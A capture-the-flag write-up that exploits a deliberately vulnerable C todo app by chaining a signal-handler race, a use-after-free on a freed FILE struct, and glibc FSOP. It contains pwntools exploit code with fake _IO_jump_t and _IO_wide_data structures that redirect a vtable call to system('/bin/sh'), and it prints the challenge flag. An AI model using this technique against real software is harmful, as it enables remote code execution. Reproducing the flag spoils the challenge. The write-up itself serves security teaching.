# not\_so\_average\_todo\_app
Call me average no more  

**FLAG** : ODESSEY{c4ll\_m3\_4v3r463\_n0\_m0r3\_5vp\_w4k4\_w4k4\_3h\_3h}  

## writeup
### checksec

```yaml
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This challenge is a sequel to odyssey quals, might wanna give it a look before reading this.  
The challenge is a todo app where we have options to create, list, edit, dump, and load todos.  

## Code analysis
```c
FILE *x;                            
char *todos[TODOSZ] = {0};
uint32_t todosz[TODOSZ] = {0};
uint32_t todoit = 0;
```

Who needs structs when you have an array of char pointers to store todos, an array of integers to store their sizes, an iterator, and a file where we can save and load our todos?
The code starts with initializing signal handlers, we got two `restore_handler` for SIGSEGV and `alarm_handler` for SIGALARM  
restore_handler is a hacky patch that any junior C developer might come up with without realizing how bad it could be. It does nothing other than freeing all the chunks in todos, closing x, sleeping for 5 seconds, and then exiting.  
```c
    uint32_t    i = 0;
    puts("SEGFAULT... EXITING.");
    while (i < todoit){
        free(todos[i]);
    }
    fclose(x);
    sleep(5);
    syscall(SYS_exit, EXIT_SUCCESS);
```

Next, we have `alarm_handler`, which literally displays a spinning donut and then returns to the menu.  
```c
    ...
    spinning_donut();
    ...
    menu();
    syscall(SYS_exit, EXIT_SUCCESS);
```

Like any other todo app, we can load, edit, create, dump, and list todos. These functions contain "small" vulnerabilities that, when chained together, can lead to remote code execution (RCE).

First thing first we got `create_todo`. It starts by checking if the user is attempting to write out of bounds.  
```c
    if (todoit + 1 > TODOSZ) {
        puts("Thats enough accomplishments for today, you can go sleep now.");
        syscall(SYS_exit, EXIT_SUCCESS);
    }
```
If the check passes, it takes the size of the todo from the user, allocates memory for it, reads the todo from the user, and then adds it to todos.  
```c
    printf("Todo size >> ");
    scanf("%d", &todosz[todoit]);
    ...
    todos[todoit] = (char *) malloc(todosz[todoit] + 1);
    ...
    read(0, todos[todoit], todosz[todoit]);
    ...
    todoit++;
```

The second function is list_todos, which does nothing but iterate over the todos and print them.  
```c
    while (it < todoit){
        printf("[ ] - %s\n", todos[it]);
        it++;
    }
```

The third function, edit_todo, takes an already allocated chunk and allows you to modify its contents.  
```c
    printf("todo index >> ");
    uint32_t idx = 0;
    scanf("%d", &idx);
    getchar();
    if (idx > todoit){                  // no writing out of bounds
        puts("todo doesn't exist");
        return;
    }
    printf("todo >> ");
    read(0, todos[idx], todosz[idx]);
```

The last two functions are load_todos and dump_todos.  
load_todos doesn't do much; it just asks for the filename and exits.  
On the other hand, dump_todos does something useful. It iterates over all the todos and writes them to x, then flushes and exits.  
```c
    fclose(stdout);
    uint32_t it = 0;
    char buffer[1000];
    while (it < todoit){
        bzero(buffer, 0);
        strncpy(buffer, todos[it], strlen(todos[it]));
        write(x->_fileno, buffer, strlen(buffer));
        it++;
    }
    fflush(x);
    syscall(SYS_exit, EXIT_SUCCESS);
}
```

## exploit
disclaimer: the exploitation is so messy, you are warned!!  
To exploit this program, we will chain three vulnerabilities: a signal race condition, use-after-free, and File Stream Oriented Programming (FSOP).  

### signal race condition
Before continuing i recommend you to read this [paper](https://lcamtuf.coredump.cx/signals.txt), it's an amazing paper by [Michał Zalewski](https://en.wikipedia.org/wiki/Micha%C5%82_Zalewski) documenting every inch of the nasty vulnerability.  

Now that we are done with that, let's dive  
As mentioned earlier, we have two signal handlers: restore_handler and alarm_handler. As explained in the paper, "LINUX" doesn't care about the flow of execution inside the handler; it only knows that a signal arrived and must redirect execution to the correct handler.  

To trigger restore handler we must segfault the program, here it comes (drum roll....) the loved *NULL pointer dereferencing* in load_todos  

```c
    int size;
    scanf("%d", &size);
    ...
    char *buffer = malloc(size);
    ...
    read(0, buffer, 77);
```

malloc takes a size_t as a parameter, so when given a negative number, it overflows to a large number, causing malloc to return a NULL pointer. Later, this NULL pointer is dereferenced by read, causing a segfault.  

```py
def segv():
    pp.recvuntil(b">> ")
    pp.sendline(b"5")
    pp.recvuntil(b">>")
    pp.sendline(b"-1");
    pp.recvuntil(b">> ")
    pp.sendline(b"nop")
```

We know that alarm_handler will be automatically called after 18 seconds, and restore_handler sleeps for 5 seconds before exiting. We can stop the restore_handler function just before it exits by invoking alarm_handler at the correct time. This will close x, free it, and leave it back to us, causing a use-after-free.  

### use after free
Now, we can control x as we want since it's just a freed chunk in memory, and malloc doesn’t care about the leaks it contains. We can use these leaks to our advantage.
So what better way to enjoy your leaks? allocating them as some notes.  

[\_IO\_FILE](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/libio/bits/types/struct_FILE.h#L49) struct is a rich struct, full with leaks

```
pwndbg> p *(FILE *)x
$2 = {
  _flags = 1701649199,
  _IO_read_ptr = 0x3c696894030dbd4 <error: Cannot access memory at address 0x3c696894030dbd4>,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x79a05b5ba4e0 <_IO_2_1_stderr_>,
  _fileno = -1,
  _flags2 = 0,
  _old_offset = 0,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = "",
  _lock = 0x5656d1b2f380,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x5656d1b2f390,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  _prevchain = 0x79a05b5ba4c0 <_IO_list_all>,
  _mode = 0,
  _unused2 = '\000' <repeats 19 times>
}
```

```py
    log.info("x is freed")
    log.info("allocating x")
    libc_leak = 120 - 16
    heap_leak = 152 - 16
    pp.recvuntil(b">> ")
    pp.recvuntil(b">> ")
    create_todo(b"/bin/sh\x00", 12)
    create_todo(cyclic(libc_leak), 463)
    _chain = unpack_ptr(list_todos(1).replace(cyclic(libc_leak), b""))      # points to stderr
    edit_todo(cyclic(heap_leak), 1)
    _lock = unpack_ptr(list_todos(1).replace(cyclic(heap_leak), b""))
    libc.address = _chain - 2172128
    elf.heap = _lock - 896
```

We got everything we need, let's procceed to the FSOP

### FSOP
Im not gonna explain FSOP in this writeup so before continuing you might wanna check these arcticles [1](https://niftic.ca/posts/fsop/) [2](https://faraz.faith/2020-10-13-FSOP-lazynote/)  

From the libc, we know that the vtable is protected, so we can't modify it directly. However, we can modify the `_wide_data` vtable, and this is where the mess begins. I haven't found any existing structures for `_IO_wide_data`, so I had to create them myself.  

```py
class _IO_jump_t:
    address = 0
    dummy = 0
    dummy2 = 0
    finish = 0
    overflow = 0
    underflow = 0
    uflow = 0
    pbackfail = 0
    xsputn = 0
    xsgetn = 0
    seekoff = 0
    seekpos = 0
    setbuf = 0
    sync = 0
    doallocate = 0
    read = 0
    write = 0
    seek = 0
    close = 0
    stat = 0
    showmanyc = 0
    imbue = 0
    def encode(self):
        pay = p64(self.dummy) + p64(self.dummy2)
        pay+= p64(self.finish)
        pay+= p64(self.overflow)
        pay+= p64(self.underflow)
        pay+= p64(self.uflow)
        pay+= p64(self.pbackfail)
        pay+= p64(self.xsputn)
        pay+= p64(self.xsgetn)
        pay+= p64(self.seekoff)
        pay+= p64(self.seekpos)
        pay+= p64(self.setbuf)
        pay+= p64(self.sync)
        pay+= p64(self.doallocate)
        pay+= p64(self.read)
        pay+= p64(self.write)
        pay+= p64(self.seek)
        pay+= p64(self.close)
        pay+= p64(self.stat)
        pay+= p64(self.showmanyc)
        pay+= p64(self.imbue)
        return (pay)
    def init(self):
        self.finish = libc.sym["_IO_new_file_finish"]
        self.overflow = libc.sym["__GI__IO_wfile_overflow"]
        self.underflow = libc.sym["__GI__IO_wfile_underflow"]
        self.uflow = libc.sym["__GI__IO_wdefault_uflow"]
        self.pbackfail = libc.sym["__GI__IO_wdefault_pbackfail"]
        self.xsputn = libc.sym["__GI__IO_wfile_xsputn"]
        self.xsgetn = libc.sym["__GI__IO_file_xsgetn"]
        self.seekoff = libc.sym["__GI__IO_wfile_seekoff"]
        self.seekpos = libc.sym["_IO_default_seekpos"]
        self.setbuf = libc.sym["_IO_new_file_setbuf"]
        self.sync = libc.sym["__GI__IO_wfile_sync"]
        self.doallocate = libc.sym["_IO_wfile_doallocate"]
        self.read = libc.sym["__GI__IO_file_read"]
        self.write = libc.sym["_IO_new_file_write"]
        self.seek = libc.sym["__GI__IO_file_seek"]
        self.close = libc.sym["__GI__IO_file_close"]
        self.stat = libc.sym["__GI__IO_file_stat"]
        self.showmanyc = libc.sym["_IO_default_showmanyc"]
        self.imbue = libc.sym["_IO_default_imbue"]


class _IO_wide_data:
    address = 0
    _wide_vtable = 0
    def encode(self):
        pay = b"\x00" * 224 + p64(self._wide_vtable)
        return (pay)
```

Before we can allocate the necessary structures, we need to find a way to trigger the `_wide_data` jump table. Thanks to the `dump_todos` function and the fflush call, which eventually leads to the invocation of `x->_wide_data.doallocate`, we can poison this function with the system function from libc.

```c
void dump_todos(){
    ...
    fflush(x);
    ...
}
```

Now we can start by allocating a fake `_IO_jump_t` structure in the heap and inject it using the `create_todo` function.  
```py
    wide_jump_table = _IO_jump_t()
    wide_jump_table.init()
    wide_jump_table.sync = libc.sym["system"]
    wide_jump_table.doallocate = libc.sym["system"]
    wvtpay = wide_jump_table.encode()
    create_todo(wvtpay, len(wvtpay))
```

then allocating the `_IO_wide_data` structure with the fake jumptable  
```py
    # allocating wide table
    wide_table = _IO_wide_data()
    wide_table._wide_vtable = wide_jump_table.address
    wtpay = wide_table.encode()
    create_todo(wtpay, len(wtpay))
    wide_table.address = elf.heap + 1376
    print(f"wide table {hex(wide_table.address)}")
```


Now that the wide table is set up, we need to poison the x object and call `dump_todos`. But before we can do that, we need to prepare the payload for the system function.  

Luckily, `x->_wide_data.doallocate` takes x as its first parameter, so we can inject a /bin/sh string into `x->_IO_FILE.flags` and flush it.  

However, `x->_IO_FILE.flags` is an essential variable and is checked by many functions, so instead of modifying it directly, we’ll put our argument in `x->_IO_FILE._IO_read_ptr` while just filling `x->_IO_FILE.flags` with spaces.  

```
    filepay = FileStructure()
    filepay.flags = 0x2020202020202020
    filepay._IO_read_ptr = 0x68732f6e69622f
    filepay._lock = _lock
    filepay.chain = _chain
    filepay._wide_data = wide_table.address
    filepay.vtable = libc.sym["_IO_wfile_jumps"] - 0x48
    edit_todo(bytes(filepay), 1)
    log.info("calling the gadget now")
```

Now that everything is aligned, we can simply call dump_todos and profit.  
```py
    dump_todos()
    pp.sendline(b"exec 1>&2")
    pp.interactive()
```


